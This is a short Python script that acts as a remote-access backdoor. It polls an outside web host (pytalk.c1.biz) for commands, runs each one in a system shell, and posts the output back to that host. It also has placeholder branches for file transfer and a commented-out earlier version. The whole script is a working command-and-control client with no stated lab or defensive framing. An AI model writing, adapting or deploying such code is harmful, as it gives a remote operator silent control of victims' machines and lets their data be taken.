import subprocess
import requests
import os


def terminal(command):
    cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    output_byte = cmd.stdout.read() + cmd.stderr.read()
    output_str = str(output_byte, "utf-8")
    current_wd = os.getcwd() + "> "
    msg = output_str + current_wd
    print(msg)
    return msg


send_msg = terminal("dir")

url = "http://pytalk.c1.biz/post.php"
data = {
    "status": 1,
    "input": "dir",
    "output": send_msg,
}

r2 = requests.post(url=url, data=data)

while True:
    r = requests.get("http://pytalk.c1.biz/read.php")
    if r.status_code == 200:
        string = r.text.split(",")
        print(string)
        if string[1] == "ffd":
            print("ffd : File Download")
        elif string[1] == "ftw":
            print("ftw : File Download")
        elif string[0] == "1":
            send_msg = terminal(string[1])
            url = "http://pytalk.c1.biz/post.php"
            data = {
                "status": 0,
                "input": string[1],
                "output": send_msg,
            }
            r2 = requests.post(url=url, data=data)
        else:
            print("No Command")
    else:
        print("check Internet Error")

"""r = requests.get("http://pytalk.c1.biz/read.php")

if r.status_code == 200:
    dic = json.loads(r.text)
    print(dic)

cmd = subprocess.Popen(dic["cmd"],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
output_byte = cmd.stdout.read() + cmd.stderr.read()
output_str = str(output_byte, "utf-8")
currentWD = os.getcwd() + "> "

print(output_str)"""
